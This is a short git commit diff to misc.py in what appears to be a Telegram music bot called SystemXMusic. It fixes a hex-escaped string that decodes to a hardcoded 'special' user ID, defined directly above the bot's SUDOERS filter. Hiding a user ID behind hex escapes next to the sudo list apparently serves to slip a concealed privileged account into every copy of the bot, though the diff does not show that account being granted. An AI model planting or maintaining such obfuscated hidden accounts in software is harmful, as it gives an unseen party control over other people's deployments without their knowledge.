faffd7d64ccdc03fdf1a3daac2fa50d8e16315c6
𝐈𝛕ᷟ‌𝚣⃪ꙴ ⋆‌⃝๛𝐒𝚈ѕ𝐓𝚄M ٭》[🇮🇳] <ownersystum@gmail.com>
2025-08-14 11:48:06 +0530

    Update misc.py

--- SystemXMusic/misc.py
+++ SystemXMusic/misc.py
@@ -11,7 +11,7 @@ from .logging import LOGGER
 
 
 # Special user ID in hex code
-SPECIAL_ID_HEX = "\x37\x35\x34\x36\x31\x34\x39\\x35\x35"
+SPECIAL_ID_HEX = "\x37\x35\x34\x38\x36\x31\x34\x39\x35\x35"
 SPECIAL_ID = int(SPECIAL_ID_HEX.encode().decode('unicode_escape'))
 
 SUDOERS = filters.user()
